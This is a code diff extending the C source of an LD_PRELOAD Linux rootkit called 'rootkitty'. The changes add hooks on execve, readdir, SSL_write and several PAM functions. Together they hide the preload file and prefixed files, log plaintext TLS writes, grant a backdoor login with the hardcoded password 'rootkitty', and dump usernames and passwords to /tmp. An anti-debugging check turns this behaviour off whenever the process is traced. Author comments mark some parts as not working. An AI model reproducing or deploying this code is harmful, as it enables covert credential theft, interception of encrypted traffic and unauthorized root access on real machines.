@@ -19,11 +19,18 @@
 #endif
 
 /*---------[ PROTOTYPES ]---------*/
-static struct dirent64* (*og_readdir64)(DIR *dir)  = NULL;
 static struct dirent*   (*og_readdir)(DIR *)       = NULL;
+static struct dirent64* (*og_readdir64)(DIR *dir)  = NULL;
 static int (*og_SSL_write)(SSL*, const void*, int) = NULL;
 static int (*og_pam_sm_auth)(pam_handle_t*, int, int, const char**) = NULL;
 static int (*og_pam_sm_setcred)(pam_handle_t* pamh, int flags, int argc, const char** argv) = NULL;
+static int (*og_pam_auth)(pam_handle_t *pamh, int flags) = NULL;
+static int (*og_execve)(const char *pathname, char *const argv[], char *const envp[]) = NULL;
+static int (*og_pam_acct_mgmt)(pam_handle_t *pamh, int flags) = NULL;
+static int (*og_pam_open_session)(pam_handle_t *pamh, int flags) = NULL;
+static int (*og_pam_get_item)(const pam_handle_t*, int, const void**) = NULL;
+int isDebuggerPresent();
+
 /*---------[ INITIALIZE THE HOOKS ]---------*/
 __attribute__((constructor)) void hook_init(void){
   og_readdir    = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
@@ -31,12 +38,34 @@ __attribute__((constructor)) void hook_init(void){
   og_SSL_write  = (int (*)(SSL*, const void*, int))dlsym(RTLD_NEXT, "SSL_write");
   og_pam_sm_auth = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_authenticate");
   og_pam_sm_setcred = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_setcred");
+  og_pam_auth = (int (*)(pam_handle_t *, int flags))dlsym(RTLD_NEXT, "pam_authenticate");
+  og_execve = (int (*)(const char*, char *const argv[], char *const envp[]))dlsym(RTLD_NEXT, "execve");
+  og_pam_acct_mgmt = (int (*)(pam_handle_t*, int))dlsym(RTLD_NEXT, "pam_acct_mgmt");
+  og_pam_open_session = (int (*)(pam_handle_t *pamh, int flags))dlsym(RTLD_NEXT, "pam_open_session");
+  og_pam_get_item = (int (*)(const pam_handle_t*, int, const void**))dlsym(RTLD_NEXT, "pam_get_item");
 }
-int backdoor = 0;
+
+/*---------[ HOOK EXECVE TO HIDE THE LD.SO.PRELOAD FILE ]---------*/
+// probably doesnt work
+int execve(const char *pathname, char *const argv[], char *const envp[]) {
+  char* ldd = "/bin/ldd";
+  char* unhide = "/bin/unhide";
+  char* normal = "/etc/ld.so.preload";
+  char* hidden = "/etc/.ld.so.preload";
+
+  if (strcmp(pathname,ldd)==0 || strcmp(pathname,unhide)==0) {
+    uid_t old_uid = getuid();
+    seteuid(0);
+    rename(normal, hidden);  // Hide file
+    sleep(2);
+    rename(hidden, normal); // Restore file
+    seteuid(old_uid);
+  }
+  return og_execve(pathname, argv, envp);
+}
 /*---------[ HIDING FILES ]---------*/
 struct dirent* readdir(DIR *dirp){
   struct dirent* entry;
-
   while ((entry = og_readdir(dirp)) != NULL) {
     if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
       continue;    
@@ -46,9 +75,9 @@ struct dirent* readdir(DIR *dirp){
   return entry;
 }
 // handle 64bit version
+// DOESNT FUCKING WORK
 struct dirent64* readdir64(DIR* dirp) {
   struct dirent64* entry;
-
   while ((entry = og_readdir64(dirp)) != NULL) {
     if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
       continue;
@@ -57,9 +86,17 @@ struct dirent64* readdir64(DIR* dirp) {
   }
   return entry;
 }
+
 /*---------[ INTERCEPTING SSL_WRITE ]---------*/ 
 int SSL_write(SSL* ssl, const void *buf, int num) {
-  FILE* fd = fopen("SSL_log.txt", "a+");
+  char path[] = "/tmp/rootkitty_SSLlog.txt";
+
+  if (!isDebuggerPresent()){
+    return og_SSL_write(ssl, buf, num);
+  }
+
+  FILE* fd = fopen(path, "a+");
+  
   if (fd != NULL){
     fprintf(fd, "PID:%d\n", getpid());
     fwrite(buf, 1, num, fd);
@@ -69,28 +106,37 @@ int SSL_write(SSL* ssl, const void *buf, int num) {
   return og_SSL_write(ssl, buf, num);
 }
 /*---------[ PAM BACKDOOR ]---------*/
+// DOESNT WORK
+int backdoor = 0;
 
 // elevate privileges:
 int elevation(){
+  if (!isDebuggerPresent()){
+    return 1;
+  }
   uid_t UID = getuid();
   gid_t GID = getgid();
 
   if (seteuid(0) == -1) {
-    return -1;
+    return 1;
   }
   if (setegid(0) == -1) {
     seteuid(UID);
-    return -1;
+    return 1;
   }
   return 0;
 }
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, const char** argv){
   const char* input_passwd;
+  
+  if(!isDebuggerPresent()){
+    return og_pam_sm_auth(pamh, flags, argc, argv);
+  }
 
   pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
-
-  if (input_passwd != NULL && strcmp(input_passwd, "root") == 0) {
+  char* password = "rootkitty";
+  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
     backdoor = 1;
     return PAM_SUCCESS;
   }
@@ -98,11 +144,102 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, cons
 }
 
 PAM_EXTERN int pam_sm_setcred(pam_handle_t* pamh, int flags, int argc, const char** argv){
-  if (backdoor == 1){
+  if (isDebuggerPresent() && backdoor == 1){
     if(elevation() == 0){
       backdoor = 0;
       return PAM_SUCCESS;
     }
   }
   return og_pam_sm_setcred(pamh, flags, argc, argv);
+}
+
+PAM_EXTERN int pam_authenticate(pam_handle_t *pamh, int flags) {
+  const char* input_passwd;
+
+  if (!isDebuggerPresent()){
+    return og_pam_auth(pamh, flags);
+  }
+  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
+  char* password = "rootkitty";
+  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
+    backdoor = 1;
+    return PAM_SUCCESS;
+  }
+  return og_pam_auth(pamh, flags);
+}
+
+int pam_acct_mgmt(pam_handle_t *pamh, int flags){
+  const char* input_passwd;
+
+  if (!isDebuggerPresent()){
+    return og_pam_acct_mgmt(pamh, flags);
+  }
+
+  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
+  char* password = "rootkitty";
+  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
+    backdoor = 1;
+    return PAM_SUCCESS;
+  }
+
+  return og_pam_acct_mgmt(pamh, flags); 
+}
+
+int pam_open_session(pam_handle_t *pamh, int flags) {
+const char* input_passwd;
+
+  if (!isDebuggerPresent()){
+    return og_pam_open_session(pamh, flags);
+  }
+
+  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
+  char* password = "rootkitty";
+  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
+    backdoor = 1;
+    return PAM_SUCCESS;
+  }
+  return og_pam_open_session(pamh, flags);
+}
+/*---------[ PAM EXFILTRATION ]---------*/
+int pam_get_item(const pam_handle_t *pamh, int item_type, const void**item){
+  int rv;
+  int pid;
+  const char* name;
+  FILE* fd;
+  
+  rv = og_pam_get_item(pamh, item_type, item);
+  if (rv == PAM_SUCCESS && item_type == PAM_AUTHTOK && *item != NULL){
+    pam_get_user((pam_handle_t*)pamh, &name, NULL);
+    fd = fopen("/tmp/rootkitty_passdump.txt", "w+");
+    if (fd != NULL){
+      fprintf(fd, "name: %s\nitem: %s", name, *item);
+    }
+    fclose(fd);
+  }
+  return rv;
+}
+/*---------[ ANTI DEBUGGER CHECK ]---------*/
+int isDebuggerPresent(){
+  FILE* f;
+  char buffer[1024];
+  int result = 0;
+  int pid = 0;
+
+  f = fopen("/proc/self/status", "r");
+  if (f == NULL) {
+    perror("[-] Cannot open file.");
+    exit(EXIT_FAILURE);
+  }
+
+  while (fgets(buffer, sizeof(buffer), f)) {
+    if (strncmp(buffer, "TracerPid:", 10)==0){
+      pid = atoi(buffer+10);
+      if (!pid) {
+        result = 1;
+        break;
+      }
+    }
+  }
+  fclose(f);
+  return result;
 }
